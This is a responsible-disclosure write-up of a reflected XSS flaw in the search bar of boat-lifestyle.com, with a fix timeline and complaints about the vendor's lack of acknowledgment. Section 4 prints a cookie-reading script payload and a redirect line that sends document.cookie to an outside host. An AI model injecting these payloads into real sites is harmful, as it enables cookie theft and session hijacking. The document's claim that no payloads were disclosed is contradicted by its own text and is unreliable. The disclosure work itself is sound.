# Reflected Cross-Site Scripting (XSS) on boat-lifestyle.com  
### Responsible Disclosure Case Study

**Author:** Aman Kothari  
**Vulnerability Type:** Reflected Cross-Site Scripting (XSS)  
**Severity:** High  
**Status:** Fixed (16 August 2025)  
**Disclosure Type:** Responsible Disclosure  

---

## 1. Introduction

Responsible disclosure is a critical part of maintaining a secure web ecosystem.  
This case study documents a **Reflected Cross-Site Scripting (XSS)** vulnerability that I discovered and responsibly reported on **boat-lifestyle.com**, the official website of boAt Lifestyle.

Although the issue was **fixed on the same day it was reported (16 August 2025)**, no acknowledgment or response was received, despite responsible reporting and follow-ups.

---

## 2. Vulnerability Summary

A **Reflected XSS vulnerability** existed in the **search input functionality** of the website.

Improper input validation and output encoding allowed user-supplied JavaScript to be reflected back to the browser and executed within the victim’s session.

---

## 3. Affected Endpoint
https://www.boat-lifestyle.com/

**Component:** Search Input  
**Attack Type:** Reflected Client-Side Script Injection  

---

## 4. Steps to Reproduce

1. Navigate to: https://www.boat-lifestyle.com/
2. Enter the following payload into the search bar: <xss-payload>
3. Observe a JavaScript alert, confirming successful execution.

---

### Cookie Access Validation
`<script>alert(document.cookie)</script>`

This confirms access to browser cookies if they are not protected using the `HttpOnly` flag.

---

### Redirection / Exfiltration Simulation

window.location='https://google.com?cookie='+document.cookie

This payload demonstrates how an attacker could redirect users and exfiltrate sensitive data.

> ⚠️ All testing was conducted ethically in a controlled environment without accessing real user data.

---

## 5. Proof of Concept (PoC)

- 📸 Screenshots:

- Screen Recording:


(No exploit details or payloads were publicly disclosed.)

---

## 6. Impact

If exploited, this vulnerability could allow attackers to:

- Hijack user sessions
- Steal authentication cookies
- Redirect users to malicious websites
- Inject phishing or malicious scripts
- Damage user trust and brand reputation

Given the scale of the platform, the potential impact was **high**.

---

## 7. Responsible Disclosure Timeline

| Date | Event |
|------|------|
| **16 Aug 2025** | Vulnerability identified and responsibly reported |
| **16 Aug 2025** | Vulnerability fixed on live website |
| Aug 2025 – Jan 2026 | No acknowledgment or response received |

---

## 8. Communication & Follow-Up

Despite:
- Immediate responsible disclosure
- Ethical testing practices
- No public disclosure prior to fix
- Follow-up communication

No acknowledgment, confirmation, or credit was provided.

While the technical fix is appreciated, lack of communication discourages responsible security research.

---

## 9. Lessons Learned

- Prompt fixes are effective, but transparency matters.
- Acknowledgment encourages ethical disclosure.
- Security is strengthened when organizations engage with researchers.

---

## 10. Conclusion

This case highlights the importance of recognizing and responding to responsible security disclosures.

Fixing vulnerabilities protects users, but **acknowledgment completes the responsible disclosure process**.

---

### Author Note

This write-up is shared strictly for **educational and awareness purposes**.  
No user data was accessed, modified, or misused at any stage.
